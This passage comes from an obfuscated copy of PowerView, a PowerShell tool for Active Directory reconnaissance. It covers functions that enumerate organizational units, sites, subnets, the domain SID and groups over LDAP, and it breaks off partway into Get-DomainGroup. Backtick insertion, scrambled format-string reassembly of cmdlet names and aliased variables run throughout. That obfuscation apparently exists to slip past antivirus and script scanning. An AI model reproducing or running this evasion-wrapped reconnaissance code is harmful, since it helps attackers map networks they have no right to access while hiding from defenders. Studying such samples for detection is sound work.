                ${fIL`Ter} += "$LDAPFilter"
            }

            ${O`Us`eARch`ER}."fi`LtER" = "(&(objectCategory=organizationalUnit)$Filter)"
            &("{2}{1}{3}{0}" -f 'e','o','Write-Verb','s') "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter) "

            if (${P`s`BoUNdpAramEt`eRS}[("{2}{1}{0}"-f 'e','n','FindO')]) { ${res`U`lTS} = ${o`USeArch`eR}.("{0}{1}{2}"-f 'F','ind','One').Invoke() }
            else { ${r`EsULts} = ${OUsea`Rc`her}.("{0}{2}{1}" -f 'Fi','dAll','n').Invoke() }
            ${rEsU`lTs} | &("{1}{0}{2}"-f 'h','W','ere-Object') {${_}} | &("{0}{1}{2}"-f'ForEach','-Obj','ect') {
                if (${psBO`U`N`dp`A`RamETeRs}['Raw']) {
                    
                    ${O`U} = ${_}
                }
                else {
                    ${O`U} = &("{1}{5}{4}{2}{3}{0}" -f'y','Conver','Prope','rt','LDAP','t-') -Properties ${_}."Pro`PE`RtIeS"
                }
                ${oU}."pSo`B`Ject"."TypenA`mES".("{2}{1}{0}" -f 'rt','e','Ins').Invoke(0, ("{2}{3}{0}{1}" -f 'O','U','Powe','rView.'))
                ${o`U}
            }
            if (${r`E`SuLts}) {
                try { ${rE`SULtS}.("{0}{2}{1}"-f'di','se','spo').Invoke() }
                catch {
                    &("{3}{0}{1}{2}{4}" -f'rite','-Ver','b','W','ose') ('[Get-Doma'+'i'+'nOU'+'] '+'E'+'rror '+'disposin'+'g'+' '+'of'+' '+'th'+'e '+'R'+'e'+'sults '+'o'+'b'+'ject: '+"$_")
                }
            }
            ${OusE`AR`CHer}.("{0}{1}"-f'dispos','e').Invoke()
        }
    }
}


function GEt`-d`o`MaiNsITE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}" -f'P','S','houldProcess','S'}, '')]
    [OutputType({"{0}{3}{2}{1}"-f 'Po','ite','iew.S','werV'})]
    [CmdletBinding()]
    Param (
        [Parameter(PoSItiON = 0, VaLueFROMpiPELiNE = ${tr`Ue}, VAlUeFRoMPIPELIneBYproperTYNAmE = ${t`Rue})]
        [Alias({"{1}{0}"-f 'ame','N'})]
        [String[]]
        ${I`DENti`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{0}{1}"-f 'G','UID'})]
        ${GpLI`Nk},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OMaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'F','er','ilt'})]
        [String]
        ${L`DaP`FiLtER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ROperT`i`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'AD','S','Path'})]
        [String]
        ${Se`Arc`hB`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}"-f 'er','ntrol','DomainCo','l'})]
        [String]
        ${SE`R`VeR},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{0}{1}{2}"-f'On','e','Level'}, {"{0}{1}"-f 'S','ubtree'})]
        [String]
        ${sE`A`RChsC`oPE} = ("{1}{0}"-f'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`U`LTP`AGEsiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serVER`T`iMel`Imit},

        [ValidateSet({"{0}{1}"-f'D','acl'}, {"{0}{1}"-f'G','roup'}, {"{0}{1}"-f'Non','e'}, {"{1}{0}"-f'wner','O'}, {"{0}{1}" -f 'Sac','l'})]
        [String]
        ${secur`I`TyMa`Sks},

        [Switch]
        ${TOM`Bs`TO`NE},

        [Alias({"{1}{0}{2}" -f'ur','Ret','nOne'})]
        [Switch]
        ${FInD`o`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`ed`ENt`IAl} =  ( gI ("{3}{1}{2}{0}"-f'Le:7tQ02','R','IaB','VA') )."VAL`Ue"::"EMp`TY",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${s`eaRCh`eRaR`G`UMEN`Ts} = @{
            ("{1}{0}{2}" -f'archBasePre','Se','fix') = ("{0}{2}{1}{4}{3}"-f 'CN=Site','nfig','s,CN=Co','n','uratio')
        }
        if (${pS`B`O`Un`D`pARameTerS}[("{0}{1}"-f'D','omain')]) { ${sEARcHE`R`ARgu`m`Ents}[("{0}{1}"-f'D','omain')] = ${D`OMaIN} }
        if (${PSbo`UNDpar`AMet`eRs}[("{2}{1}{0}"-f'perties','o','Pr')]) { ${SE`Ar`c`HE`RarGu`ments}[("{1}{0}{2}"-f'rti','Prope','es')] = ${Pr`OPERTI`ES} }
        if (${p`SBoundP`ArAMEte`RS}[("{0}{1}{2}"-f'Sear','chB','ase')]) { ${S`eARcHER`A`RGu`me`Nts}[("{2}{1}{0}"-f 'hBase','arc','Se')] = ${S`E`Archba`sE} }
        if (${pSBo`U`N`DpAra`METe`RS}[("{1}{0}"-f'rver','Se')]) { ${s`EarC`hER`ArguMen`Ts}[("{0}{1}"-f 'Serve','r')] = ${se`RV`er} }
        if (${PSb`oU`NdPARAMet`erS}[("{2}{1}{3}{0}" -f 'ope','earch','S','Sc')]) { ${SEARc`H`eRaRgUMe`N`Ts}[("{0}{2}{1}" -f'Searc','pe','hSco')] = ${se`AR`CH`ScoPE} }
        if (${Psb`OU`NDpARaMe`T`Ers}[("{4}{1}{0}{3}{2}"-f 'tPag','esul','e','eSiz','R')]) { ${seArchEr`ARgUME`N`TS}[("{3}{4}{2}{0}{1}" -f 'eSiz','e','Pag','Resul','t')] = ${R`e`SUltpA`G`ESiZE} }
        if (${pSBOuNDparAM`eT`E`RS}[("{1}{0}{2}{3}"-f 'verT','Ser','imeLimi','t')]) { ${SEarCH`Erarg`U`M`E`NTS}[("{2}{1}{4}{3}{0}"-f'eLimit','v','Ser','im','erT')] = ${SeR`VeRTIME`LI`M`iT} }
        if (${PS`BOu`N`d`parAMeterS}[("{2}{3}{1}{0}"-f 's','ityMask','Secu','r')]) { ${se`A`RCH`ErargumeNTs}[("{1}{2}{0}" -f 'asks','Secu','rityM')] = ${sECurit`Y`M`ASKS} }
        if (${psbOuN`dPARam`EtE`Rs}[("{0}{2}{1}" -f'Tomb','e','ston')]) { ${S`e`ARCHerARG`UMEn`Ts}[("{1}{0}"-f 'ne','Tombsto')] = ${To`mBs`TONe} }
        if (${P`sBOUN`d`paRa`MET`ErS}[("{2}{1}{0}"-f 'tial','reden','C')]) { ${SEa`RCHErA`RG`UmE`NTs}[("{1}{3}{0}{2}"-f 'n','Cred','tial','e')] = ${cREde`N`TiaL} }
        ${sI`T`ES`eaRchER} = &("{2}{1}{3}{4}{0}"-f 'r','et-','G','DomainSearch','e') @SearcherArguments
    }

    PROCESS {
        if (${SIt`e`sEa`RcHER}) {
            ${Id`E`NTiTYfiLTEr} = ''
            ${F`iLTer} = ''
            ${ide`Nt`iTy} | &("{0}{2}{1}" -f 'Where-O','ect','bj') {${_}} | &("{2}{3}{1}{0}"-f'ct','je','For','Each-Ob') {
                ${I`D`EnTITYin`S`TA`NCE} = ${_}.("{1}{0}"-f 'ace','Repl').Invoke('(', '\28').("{0}{2}{1}"-f 'R','lace','ep').Invoke(')', '\29')
                if (${ID`eNTIT`yIN`s`TancE} -match ("{1}{0}"-f'*','^CN=.')) {
                    ${IdenT`iTy`FIlT`Er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${p`sbOUn`DPA`RaMetE`Rs}[("{0}{2}{1}" -f'D','ain','om')]) -and (-not ${PsBouNdpa`RA`Mete`Rs}[("{0}{1}{2}"-f'SearchB','as','e')])) {
                        
                        
                        ${iDENtIt`y`DoM`A`In} = ${Ide`N`TIt`yI`NST`ANCe}.("{0}{1}" -f 'SubSt','ring').Invoke(${Iden`T`i`TyI`NSt`ANce}.("{2}{0}{1}"-f 'ndex','Of','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{2}{0}"-f'ose','Write-','Verb') ('[Get-'+'D'+'om'+'a'+'in'+'Site] '+'Ext'+'rac'+'te'+'d '+'domain'+' '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${S`e`ARCHErARg`UmenTS}[("{0}{1}" -f 'Doma','in')] = ${I`deNTItyd`O`maiN}
                        ${sI`TEsE`ARc`HER} = &("{0}{1}{3}{2}" -f'G','et-Doma','rcher','inSea') @SearcherArguments
                        if (-not ${siTeSE`A`RcH`Er}) {
                            &("{1}{3}{0}{2}" -f '-Wa','Wri','rning','te') ('['+'Ge'+'t-'+'DomainS'+'ite] '+'Una'+'ble '+'to'+' '+'ret'+'rie'+'ve '+'domain'+' '+'searc'+'her'+' '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${gU`IdbytE`STri`Ng} = (-Join (([Guid]${iDent`i`T`YINstanCe}).("{0}{2}{1}" -f'ToBy','y','teArra').Invoke() | &("{3}{1}{2}{4}{0}" -f'ct','orE','ac','F','h-Obje') {${_}.("{0}{1}" -f'ToStrin','g').Invoke('X').("{0}{1}"-f 'PadL','eft').Invoke(2,'0')})) -Replace (("{1}{0}"-f')','(..')),'\$1'
                        ${iDEntit`Y`FI`ltEr} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${id`E`NT`iTYfilTEr} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${id`e`NtiTYf`iltEr} -and (${I`DentI`TYfi`ltEr}.("{1}{0}"-f 'im','Tr').Invoke() -ne '') ) {
                ${fiLT`er} += "(|$IdentityFilter)"
            }

            if (${P`sBOuN`dPar`AmE`TErs}[("{0}{1}" -f'G','PLink')]) {
                &("{1}{0}{3}{2}" -f'e','Writ','Verbose','-') ('[Ge'+'t-Do'+'mainSi'+'te] '+'Sear'+'c'+'hing '+'for'+' '+'sit'+'es'+' '+'w'+'ith '+"$GPLink "+'set'+' '+'in'+' '+'t'+'he '+'gpL'+'ink'+' '+'pro'+'per'+'ty')
                ${fiL`T`er} += "(gplink=*$GPLink*)"
            }

            if (${PsbOU`Ndpa`R`A`mETErs}[("{1}{2}{0}" -f 'er','L','DAPFilt')]) {
                &("{3}{0}{1}{2}"-f 't','e-Ver','bose','Wri') ('[Get-'+'Do'+'m'+'ai'+'nSit'+'e] '+'Using'+' '+'a'+'d'+'ditional'+' '+'L'+'DAP '+'fi'+'lter:'+' '+"$LDAPFilter")
                ${F`Il`TEr} += "$LDAPFilter"
            }

            ${sitE`seA`R`Cher}."fIlT`ER" = "(&(objectCategory=site)$Filter)"
            &("{0}{2}{1}"-f 'Wri','-Verbose','te') "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter) "

            if (${p`SbOUnDPA`RAm`ETeRs}[("{1}{2}{0}" -f 'One','F','ind')]) { ${reS`Ul`TS} = ${SIt`ESe`ArcHEr}.("{0}{1}" -f'F','indAll').Invoke() }
            else { ${R`eS`ULtS} = ${SITeSE`Ar`cH`er}.("{0}{1}{2}"-f 'Fi','ndA','ll').Invoke() }
            ${REs`UL`Ts} | &("{0}{1}{2}"-f 'Wher','e','-Object') {${_}} | &("{1}{0}{2}" -f'h-Ob','ForEac','ject') {
                if (${ps`BOundPA`RAm`et`ErS}['Raw']) {
                    
                    ${S`iTE} = ${_}
                }
                else {
                    ${s`Ite} = &("{2}{1}{4}{0}{3}" -f '-LD','ver','Con','APProperty','t') -Properties ${_}."p`ROPERtI`Es"
                }
                ${Si`Te}."PSoBJ`e`ct"."TYpENA`m`es".("{0}{1}"-f 'Ins','ert').Invoke(0, ("{2}{0}{1}{3}"-f 'w','.','PowerVie','Site'))
                ${si`TE}
            }
            if (${r`eSU`ltS}) {
                try { ${r`e`SuLts}.("{0}{1}{2}"-f 'd','ispo','se').Invoke() }
                catch {
                    &("{2}{3}{0}{4}{1}" -f 'e-Verb','se','Wri','t','o') ("{3}{7}{5}{4}{12}{8}{11}{13}{0}{1}{6}{2}{10}{9}"-f ' of ','the Result',' ','[Get-Domai','te]','i','s','nS',' ','ect','obj','d',' Error','isposing')
                }
            }
            ${sIteS`Ea`RCHeR}.("{1}{0}" -f 'e','dispos').Invoke()
        }
    }
}


function geT-D`O`mA`INsUb`Net {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}"-f'ocess','P','S','ShouldPr'}, '')]
    [OutputType({"{1}{2}{0}{3}{4}"-f'Vie','Pow','er','w.','Subnet'})]
    [CmdletBinding()]
    Param (
        [Parameter(PositIon = 0, vAlUefrOmpiPELIne = ${Tr`Ue}, vALUEFroMPiPElInEByPRopErtynaMe = ${tR`UE})]
        [Alias({"{1}{0}"-f 'me','Na'})]
        [String[]]
        ${ID`e`Nt`ITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Si`Te`NAME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`A`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'er','Filt'})]
        [String]
        ${l`dA`pfil`Ter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pro`P`erTIES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADSPa','th'})]
        [String]
        ${s`Ear`C`hbAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{4}{0}{1}"-f'inControll','er','om','D','a'})]
        [String]
        ${S`E`RveR},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{2}{1}"-f'On','el','eLev'}, {"{1}{0}{2}" -f 'ubtr','S','ee'})]
        [String]
        ${SEA`RCHs`copE} = ("{1}{0}" -f 'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`sUlTpAG`e`SiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVE`RtI`Meli`m`IT},

        [ValidateSet({"{0}{1}" -f 'D','acl'}, {"{1}{0}" -f'oup','Gr'}, {"{0}{1}" -f'No','ne'}, {"{1}{0}"-f 'er','Own'}, {"{1}{0}" -f'cl','Sa'})]
        [String]
        ${SEcurIT`YMA`sKS},

        [Switch]
        ${T`o`MbsTO`NE},

        [Alias({"{1}{0}{2}"-f'urn','Ret','One'})]
        [Switch]
        ${fIN`Done},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eDe`NtIAl} =   (  ls ("{0}{1}{2}{3}"-f'vArI','a','b','Le:7tQ02') )."Val`Ue"::"Emp`Ty",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${SEaR`CHE`R`A`RGUm`enTS} = @{
            ("{2}{3}{4}{0}{1}"-f 'Pref','ix','S','earchBas','e') = ("{6}{7}{0}{8}{4}{5}{2}{1}{9}{10}{3}"-f 'ets,','Config','N=','on','Si','tes,C','CN=Sub','n','CN=','ur','ati')
        }
        if (${PSBoUNdP`AraM`E`TerS}[("{1}{0}"-f'omain','D')]) { ${s`ea`RCh`eRaRguMENtS}[("{2}{1}{0}"-f 'in','ma','Do')] = ${dO`MA`iN} }
        if (${PSb`oUNDPar`Am`e`TERS}[("{2}{0}{3}{1}"-f'r','ties','P','oper')]) { ${Se`ArCHE`R`A`RgumeNTS}[("{2}{0}{1}{3}" -f 'r','o','P','perties')] = ${pr`o`per`TiEs} }
        if (${pSbo`UnDpA`R`AmeT`ERS}[("{2}{1}{0}"-f'rchBase','ea','S')]) { ${seaRCH`eR`ARgUM`Ents}[("{2}{0}{1}{3}" -f'rc','hBa','Sea','se')] = ${S`E`ArcHBAse} }
        if (${Ps`B`OUNDpa`R`AmeTErS}[("{0}{2}{1}" -f 'Se','ver','r')]) { ${sE`ARCH`eRA`RGumENTS}[("{2}{1}{0}"-f 'r','e','Serv')] = ${Se`RVer} }
        if (${ps`B`oUnDPA`RAM`e`TerS}[("{1}{2}{0}"-f 'hScope','Se','arc')]) { ${sEar`ch`ERA`R`GUMe`Nts}[("{0}{2}{1}" -f 'Se','e','archScop')] = ${SEa`R`cH`scOpe} }
        if (${ps`BO`Un`DP`A`RAMEteRS}[("{1}{2}{4}{0}{3}" -f 'a','Res','ult','geSize','P')]) { ${se`Ar`chER`ArGuMEN`Ts}[("{4}{0}{3}{1}{2}"-f 'es','PageSi','ze','ult','R')] = ${ReS`ULtpag`eS`iZe} }
        if (${ps`BoU`Nd`P`Ara`MeteRs}[("{4}{2}{3}{0}{1}" -f 'erTimeLim','it','e','rv','S')]) { ${SEA`RchER`A`R`g`UMents}[("{2}{1}{0}"-f'meLimit','erverTi','S')] = ${S`ErvERtI`MelIM`iT} }
        if (${pSb`o`U`NdPA`RAmEters}[("{0}{2}{1}"-f 'Secu','ks','rityMas')]) { ${SEArcheRaR`g`U`M`EntS}[("{3}{1}{2}{0}"-f'ks','it','yMas','Secur')] = ${SE`cURI`TYm`AS`kS} }
        if (${PS`Bo`U`NDPA`RAMEtErs}[("{0}{1}"-f'Tombsto','ne')]) { ${sEarChER`A`R`GUMe`Nts}[("{1}{2}{0}" -f 'ne','Tomb','sto')] = ${TO`MB`sTOnE} }
        if (${PSB`OuN`dpARA`me`Te`Rs}[("{0}{1}{2}" -f'C','rede','ntial')]) { ${S`EaR`C`Her`A`RGuMeNTS}[("{0}{1}{2}" -f 'Cr','edent','ial')] = ${cRe`d`ENtiaL} }
        ${s`UBNE`TSeArcHer} = &("{4}{5}{0}{2}{3}{1}" -f 'Dom','archer','ai','nSe','G','et-') @SearcherArguments
    }

    PROCESS {
        if (${S`UBne`TSeaR`CHeR}) {
            ${iDENt`i`Ty`Fi`LteR} = ''
            ${f`ILT`ER} = ''
            ${iD`e`NTI`TY} | &("{0}{3}{1}{2}"-f'Whe','bj','ect','re-O') {${_}} | &("{0}{3}{2}{1}" -f 'ForEac','ct','e','h-Obj') {
                ${Ide`N`Ti`TyI`NstANce} = ${_}.("{1}{0}" -f 'place','Re').Invoke('(', '\28').("{1}{0}{2}"-f'la','Rep','ce').Invoke(')', '\29')
                if (${i`DENTI`Ty`I`NSTAnCE} -match ("{1}{0}"-f'=.*','^CN')) {
                    ${iDeNtITYf`iLt`er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psb`O`U`NdPArAmeT`e`RS}[("{1}{0}"-f'ain','Dom')]) -and (-not ${pSB`oUNDpaR`A`M`ET`erS}[("{1}{0}{3}{2}" -f 'ear','S','Base','ch')])) {
                        
                        
                        ${IdEnT`itY`DoM`AIn} = ${Id`EnTiTyIN`Sta`NcE}.("{1}{0}"-f 'ing','SubStr').Invoke(${iDE`N`T`it`YinstA`NCe}.("{0}{1}" -f 'Index','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{4}{3}{0}{1}" -f 'te-','Verbose','W','i','r') ('[Ge'+'t'+'-D'+'omai'+'nSubnet] '+'Ext'+'racte'+'d '+'doma'+'in '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${s`e`A`RchE`RarguMenTS}[("{0}{2}{1}"-f 'D','n','omai')] = ${i`D`eNt`ITydoMaIn}
                        ${Sub`N`e`TseARchER} = &("{4}{0}{3}{1}{2}"-f'et-D','inSea','rcher','oma','G') @SearcherArguments
                        if (-not ${SUB`NE`TsEA`RchER}) {
                            &("{3}{0}{1}{2}"-f'e-W','a','rning','Writ') ('['+'G'+'et-DomainSu'+'bn'+'e'+'t] '+'Unabl'+'e '+'t'+'o '+'retrie'+'v'+'e'+' '+'d'+'om'+'ain '+'s'+'ear'+'cher '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${GUIDByte`S`TRI`NG} = (-Join (([Guid]${Id`E`N`TI`TYin`stancE}).("{2}{1}{0}" -f'y','oByteArra','T').Invoke() | &("{3}{0}{1}{2}" -f 'Each-Ob','jec','t','For') {${_}.("{0}{2}{1}"-f'ToSt','ng','ri').Invoke('X').("{1}{0}"-f'Left','Pad').Invoke(2,'0')})) -Replace ("{0}{1}"-f'(','..)'),'\$1'
                        ${Ident`I`TY`FIltEr} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${i`DeNT`iT`YFILt`Er} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${I`deNTi`TYFi`LtEr} -and (${IDEnT`ITyf`Il`T`ER}.("{0}{1}" -f 'Tr','im').Invoke() -ne '') ) {
                ${fIl`T`er} += "(|$IdentityFilter)"
            }

            if (${pS`B`ouNDpARameTe`Rs}[("{1}{3}{0}{2}" -f'Filte','LD','r','AP')]) {
                &("{3}{4}{2}{0}{1}" -f 'er','bose','V','Write','-') ('[Get-'+'Dom'+'ainSubn'+'e'+'t'+']'+' '+'U'+'sing'+' '+'addi'+'tio'+'nal '+'LDA'+'P '+'fil'+'ter: '+"$LDAPFilter")
                ${FIL`TEr} += "$LDAPFilter"
            }

            ${sUBN`etSEA`R`Cher}."F`IltER" = "(&(objectCategory=subnet)$Filter)"
            &("{1}{2}{0}{3}" -f 'e-Verbo','Wri','t','se') "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter) "

            if (${psb`oUN`D`parAMETERS}[("{1}{0}"-f 'indOne','F')]) { ${re`SU`lts} = ${sUBnEts`eA`Rc`HeR}.("{1}{2}{0}" -f 'ndOne','F','i').Invoke() }
            else { ${r`ESuLtS} = ${sU`BNE`T`seA`RCHer}.("{1}{0}{2}" -f 'in','F','dAll').Invoke() }
            ${RE`Su`Lts} | &("{3}{1}{0}{2}"-f're-Obj','e','ect','Wh') {${_}} | &("{2}{1}{0}"-f 'Each-Object','r','Fo') {
                if (${Ps`BoUNDP`A`RAME`TE`RS}['Raw']) {
                    
                    ${sUBn`ET} = ${_}
                }
                else {
                    ${s`UB`Net} = &("{1}{4}{0}{3}{2}{5}" -f'LD','Conv','oper','APPr','ert-','ty') -Properties ${_}."p`Rop`ERTiES"
                }
                ${SU`BN`Et}."P`SOB`JECt"."TyPEN`Ames".("{1}{0}" -f't','Inser').Invoke(0, ("{2}{0}{3}{1}"-f'erVie','ubnet','Pow','w.S'))

                if (${P`sBouN`DPa`RAMe`Ters}[("{1}{2}{0}"-f 'ame','Si','teN')]) {
                    
                    
                    if (${sU`BNEt}."p`ROPErti`es" -and (${S`U`BNet}."P`ROP`ERTIES"."s`iTEob`JecT" -like "*$SiteName*")) {
                        ${Su`BNET}
                    }
                    elseif (${Sub`NEt}."s`IteOb`JeCt" -like "*$SiteName*") {
                        ${s`Ub`NEt}
                    }
                }
                else {
                    ${sUb`Net}
                }
            }
            if (${rEs`UL`Ts}) {
                try { ${RE`SU`ltS}.("{0}{2}{1}" -f'disp','se','o').Invoke() }
                catch {
                    &("{2}{1}{0}"-f 'Verbose','te-','Wri') ('[Ge'+'t-Do'+'ma'+'inSu'+'bne'+'t] '+'E'+'rror '+'dispo'+'sin'+'g '+'o'+'f '+'th'+'e '+'R'+'e'+'sults '+'obj'+'ect:'+' '+"$_")
                }
            }
            ${sU`Bn`E`TS`EarCHer}.("{0}{1}{2}"-f 'd','ispo','se').Invoke()
        }
    }
}


function GEt-dO`mai`N`SId {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{1}{0}{2}" -f 'uld','o','Process','PSS','h'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${doMa`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}" -f 'r','Contr','Domain','olle'})]
        [String]
        ${sER`VER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`edEN`T`iAl} =  ( GEt-chiLditEM  ("{1}{3}{0}{4}{2}" -f'a','V','Q02','aRI','bLE:7T'))."VA`lUE"::"EMp`Ty",

        [Switch]
        ${s`sL},

        [Switch]
        ${o`Bfu`Scate}
    )

    ${Sea`RCHERarG`UM`e`NTs} = @{
        ("{0}{2}{1}" -f 'LDAP','r','Filte') = ("{0}{6}{7}{5}{1}{4}{13}{11}{12}{14}{2}{8}{9}{3}{10}" -f '(us','C','1135','19','ont','ccount','e','rA','56','.1.4.803:=8','2)','l:','1.2.84','ro','0.')
    }
    if (${p`S`BoUNd`PARAMet`ERS}[("{1}{0}{2}" -f'omai','D','n')]) { ${sEaR`ChEr`Argum`E`NtS}[("{1}{0}" -f 'in','Doma')] = ${d`O`MAiN} }
    if (${p`sbOundP`Ar`AMe`TeRS}[("{0}{1}" -f'Ser','ver')]) { ${SE`A`Rc`HeRARgUM`en`Ts}[("{2}{1}{0}" -f'ver','r','Se')] = ${S`eRVer} }
    if (${pSbouND`parA`me`Ters}[("{1}{0}{2}"-f 'dentia','Cre','l')]) { ${s`E`A`RcHerAr`gU`MenTs}[("{2}{1}{0}{3}" -f 'n','e','Cred','tial')] = ${cR`EDENTI`Al} }
    if (${psbO`Un`d`pa`RaMEte`RS}['SSL']) { ${s`e`ArC`heR`ARgUmeNTS}['SSL'] = ${s`Sl} }
    if (${PsbOu`N`DPA`RA`m`eteRS}[("{0}{1}{2}"-f'Ob','fusca','te')]) {${sE`ARCHe`RaR`gu`m`eNTs}[("{0}{2}{1}"-f 'Obfus','ate','c')] = ${ob`FuS`caTE} }

    ${dC`SID} = &("{1}{3}{2}{0}"-f 'Computer','Ge','Domain','t-') @SearcherArguments -FindOne | &("{1}{2}{0}"-f'ct-Object','S','ele') -First 1 -ExpandProperty ("{0}{1}"-f 'obj','ectsid')

    if (${D`cSid}) {
        ${d`Cs`id}.("{2}{1}{0}" -f 'g','trin','SubS').Invoke(0, ${Dc`SID}.("{0}{2}{1}"-f'L','Of','astIndex').Invoke('-'))
    }
    else {
        &("{2}{1}{0}{4}{3}"-f'e-Ve','t','Wri','bose','r') ('[G'+'et-'+'DomainSID] '+'Error'+' '+'extr'+'actin'+'g '+'do'+'m'+'ain '+'SID'+' '+'f'+'or '+"'$Domain'")
    }
}


function get-DO`mA`I`NGr`oup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}" -f 'uldPro','P','cess','SSho'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{4}{1}{5}{3}{6}"-f 'PS','redVa','UseDecl','nA','a','rsMoreTha','ssignments'}, '')]
    [OutputType({"{2}{0}{3}{1}"-f'werView.','up','Po','Gro'})]
    [CmdletBinding(DefaULtpAramEteRsetnAmE = {"{2}{1}{0}"-f 'n','io','AllowDelegat'})]
    Param(
        [Parameter(POSition = 0, vAluEFRoMPIPeLINE = ${TR`UE}, VALueFROmPIPeliNeByPROpERtynAME = ${Tr`Ue})]
        [Alias({"{4}{1}{2}{5}{0}{3}"-f'hedNam','is','ting','e','D','uis'}, {"{2}{1}{0}{4}{3}" -f'A','am','S','e','ccountNam'}, {"{0}{1}" -f'Nam','e'}, {"{0}{3}{2}{1}{4}" -f 'Mem','ishedNa','istingu','berD','me'}, {"{2}{0}{1}"-f'erNam','e','Memb'})]
        [String[]]
        ${IdENT`i`Ty},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'erName','Us'})]
        [String]
        ${mEM`BEr`IdEN`TiTY},

        [Switch]
        ${AD`Min`CoUNT},

        [ValidateSet({"{0}{1}{2}"-f'Domai','nLoc','al'}, {"{0}{1}{4}{2}{3}"-f 'NotD','o','ainLo','cal','m'}, {"{1}{2}{0}"-f'l','Glo','ba'}, {"{2}{0}{1}" -f 'o','tGlobal','N'}, {"{0}{2}{1}" -f'Unive','al','rs'}, {"{3}{2}{1}{0}" -f'ersal','v','Uni','Not'})]
        [Alias({"{0}{1}"-f'S','cope'})]
        [String]
        ${GR`o`UpsCOPe},

        [ValidateSet({"{0}{2}{1}" -f'Secu','ty','ri'}, {"{2}{1}{0}"-f'n','ibutio','Distr'}, {"{1}{2}{3}{0}"-f 'm','Cre','ate','dBySyste'}, {"{0}{2}{4}{3}{5}{1}" -f 'Not','em','Cr','ySy','eatedB','st'})]
        [String]
        ${G`ROupPro`PeRTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`o`mAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'ter','Fil'})]
        [String]
        ${LDa`pf`Ilt`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prO`Pert`i`Es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'Pa','ADS','th'})]
        [String]
        ${SE`A`R`cHBasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}" -f'ler','inControl','ma','Do'})]
        [String]
        ${se`Rv`Er},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{1}{2}{0}" -f'evel','O','neL'}, {"{0}{1}" -f 'Subtr','ee'})]
        [String]
        ${se`A`Rchs`cOpE} = ("{0}{1}" -f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`SULtP`AgeSizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRVert`i`mELi`MIt},

        [ValidateSet({"{0}{1}" -f'Dac','l'}, {"{1}{0}" -f'oup','Gr'}, {"{0}{1}"-f'No','ne'}, {"{0}{1}"-f 'O','wner'}, {"{0}{1}"-f 'Sac','l'})]
        [String]
        ${sec`UrItYma`Sks},

        [Switch]
        ${To`mb`STOne},

        [Alias({"{0}{1}" -f 'Retu','rnOne'})]
        [Switch]
        ${fIND`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRedeN`T`IAL} =   ( Ls ('V'+'AriABle:'+'7TQ'+'02'))."Va`LUe"::"e`mPTy",

        [Switch]
        ${r`Aw},

        [Switch]
        ${S`sl},

        [Switch]
        ${o`BfuSCA`Te}
    )

    BEGIN {
